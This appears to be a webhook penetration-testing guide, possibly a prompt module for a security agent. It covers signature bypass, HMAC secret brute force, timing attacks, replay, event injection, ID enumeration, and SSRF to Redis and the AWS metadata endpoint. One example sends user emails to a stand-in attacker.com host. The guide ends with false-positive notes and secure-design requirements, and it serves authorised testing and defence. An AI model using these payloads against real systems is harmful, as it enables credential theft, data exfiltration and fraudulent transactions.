<webhook_security_guide>
<title>WEBHOOK SECURITY</title>

<critical>Webhooks enable server-to-server notifications but introduce SSRF, signature bypass, replay attacks, and timing vulnerabilities. Test signature validation, SSRF via webhook URLs, replay protection, timing attacks, URL enumeration, event injection, and callback manipulation.</critical>

<scope>
- Signature validation bypass (HMAC, JWT)
- SSRF via webhook URLs
- Replay attacks (nonce, timestamp validation)
- Timing attacks on signature verification
- Webhook URL enumeration
- Event injection and manipulation
- Callback URL parameter abuse
- Rate limiting and DoS
</scope>

<methodology>
1. Register webhook: capture signature generation method
2. Test signature: bypass HMAC, JWT validation
3. Test SSRF: point webhook to internal/cloud metadata
4. Test replay: reuse old webhook payloads
5. Test timing: measure signature verification time
6. Test injection: manipulate event types, data
7. Test enumeration: discover other webhook URLs
8. Test rate limits: flood webhooks
</methodology>

<signature_bypass>
<missing_validation>
POST /webhook/callback
X-Signature: anything
{"event": "payment.success"}
→ If processes without validation: vulnerable
</missing_validation>

<weak_secrets>
- Hardcoded: secret123, webhook_secret
- Predictable: MD5(domain), company_name
- Dictionary attack on HMAC

Brute force:
for secret in wordlist:
    sig = hmac.new(secret.encode(), body, 'sha256').hexdigest()
    if sig == received_signature:
        print(f"Found secret: {secret}")
</weak_secrets>

<algorithm_confusion>
- Expected: HMAC-SHA256
- Send: HMAC-SHA1, none, JWT
- Signature: JWT signed with HS256 using public key

X-Signature: jwt_token_with_weak_sig
</algorithm_confusion>

<timing_attacks>
- Compare signatures byte-by-byte (non-constant time)
- Leak secret via timing differences

for char in charset:
    time = measure('/webhook', sig=secret_prefix + char)
    if time > baseline:
        secret_prefix += char  # correct char takes longer
</timing_attacks>
</signature_bypass>

<ssrf_via_webhook>
<internal_targets>
POST /webhooks
{
    "url": "http://127.0.0.1:6379/",  # Redis
    "event": "user.created"
}

Trigger event → webhook fires to internal service
</internal_targets>

<cloud_metadata>
POST /webhooks
{
    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
→ Webhook sends to AWS metadata, exfiltrates in response logs
</cloud_metadata>

<data_exfiltration>
POST /webhooks
{
    "url": "http://attacker.com/log?data={user.email}"
}
→ Webhook sends sensitive data to attacker
</data_exfiltration>
</ssrf_via_webhook>

<replay_attacks>
<no_nonce>
- Capture webhook payload
- Resend later → processed again
- Duplicate transactions, events

Captured:
POST /webhook
X-Signature: valid_sig
X-Timestamp: 1234567890
{"event": "payment", "amount": 100}

Replay → payment processed twice
</no_nonce>

<weak_timestamp>
- Timestamp validation: accept ±5 minutes
- Capture and replay within window

Check:
if abs(now - timestamp) < 300:  # 5 minutes
    process()  # replayable for 10 minute window
</weak_timestamp>
</replay_attacks>

<event_injection>
<unauthorized_events>
POST /webhook/callback
{
    "event": "admin.privilege.granted",
    "user_id": "attacker"
}
→ If signature bypassed: inject privileged events
</unauthorized_events>

<parameter_tampering>
{
    "event": "payment.success",
    "user_id": 123,
    "amount": 1000,  # changed from 10
    "currency": "USD"
}
→ Modify payment amount, user ID, status
</parameter_tampering>
</event_injection>

<url_enumeration>
<webhook_ids>
- /webhooks/123 → /webhooks/124, 125, 126
- Enumerate all webhook endpoints
- Discover other customers' webhooks

for id in range(1, 10000):
    GET f"/webhooks/{id}"
    if status == 200:
        print(f"Found webhook: {id}")
</webhook_ids>

<predictable_urls>
- /webhook/{md5(email)}
- /webhook/{company_name}
- Guess and trigger

Test common: /webhook/test, /webhook/default, /webhook/admin
</predictable_urls>
</url_enumeration>

<validation>
1. Test signature: remove, modify, use weak secrets
2. Test SSRF: register webhook to internal/metadata URLs
3. Test replay: capture and resend old payloads
4. Test injection: manipulate event types and data
5. Test timing: measure signature verification time differences
6. Demonstrate impact: unauthorized access, SSRF, duplicate events
</validation>

<impact>
- SSRF to internal services, cloud metadata
- Signature bypass → unauthorized event injection
- Replay attacks → duplicate transactions
- Timing attacks → secret extraction
- Event injection → privilege escalation
- Data exfiltration via webhook URLs
</impact>

<false_positives>
- Signature validation present but using test/development secret (intended for testing)
- Webhook URL accepts internal addresses but network segmentation prevents access
- Replay window exists but idempotency keys prevent duplicate processing
- Timing differences detected but within noise threshold (not exploitable)
- Webhook enumeration possible but all endpoints require valid signatures
- Event injection blocked by schema validation on required fields
- SSRF to metadata endpoint possible but IAM role has no sensitive permissions
- Rate limiting absent but DDoS protection at infrastructure level
</false_positives>

<pro_tips>
1. Test with localhost, 127.0.0.1, metadata IPs first
2. Capture webhook payloads for replay testing
3. Check for constant-time signature comparison
4. Test all event types for injection vulnerabilities
5. Enumerate webhook IDs sequentially
6. Check rate limits per webhook vs global
7. Test with various HTTP methods (not just POST)
8. Look for webhook secrets in JavaScript, documentation
9. Test callback URL parameter injection
10. Check for webhook deletion/modification without auth
</pro_tips>

<remember>Secure webhooks require: strong signature validation (HMAC-SHA256 with high-entropy secret), constant-time comparison, replay protection (nonce + timestamp), webhook URL validation (no SSRF), authorization on webhook management, and event type validation.</remember>
</webhook_security_guide>
